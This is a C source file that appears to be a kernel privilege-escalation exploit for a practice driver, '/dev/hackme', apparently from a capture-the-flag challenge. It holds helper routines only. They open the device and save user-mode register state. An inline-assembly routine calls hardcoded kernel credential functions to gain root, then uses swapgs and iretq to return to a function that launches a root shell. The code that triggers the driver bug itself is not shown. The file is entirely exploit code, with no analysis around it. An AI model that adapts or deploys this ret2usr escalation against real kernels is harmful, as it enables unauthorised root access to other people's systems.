#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>

// Opening The Device Driver
int global_fd;
void open_dev()
{
    global_fd = open("/dev/hackme", O_RDWR);
    if (global_fd < 0)
    {
        puts("[!] Failed to open device");
        exit(-1);
    }
    else
    {
        puts("[*] Opened device");
    }
}

// Saving Registers to use when returning back to Userspace
unsigned long user_cs, user_ss, user_rflags, user_sp;
void save_state(void)
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;");
    puts("[*] Saved State");
}

// Escalate Priviliges and return Back to Userspace in a shell with uid 0
void get_shell(void)
{
    puts("[*] Returned to userland");
    if (getuid() == 0)
    {
        printf("[*] UID: %d, got root!\n", getuid());
        system("/bin/sh");
    }
    else
    {
        printf("[!] UID: %d, didn't get root!\n", getuid());
        exit(-1);
    }
}
unsigned long user_rip = (unsigned long)get_shell;
void escalate_privs(void)
{
    __asm__(
        ".intel_syntax noprefix;"
        "movabs rax, 0xffffffff814c67f0;"
        "xor rdi,rdi;"
        "call rax; mov rdi, rax;"
        "movabs rax, 0xffffffff814c6410;"
        "call rax;"
        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15,user_sp;"
        "push r15;"
        "mov r15,user_rflags;"
        "push r15;"
        "mov r15,user_cs;"
        "push r15;"
        "mov r15,user_rip;"
        "push r15;"
        "iretq;"
        ".att_syntax;");
}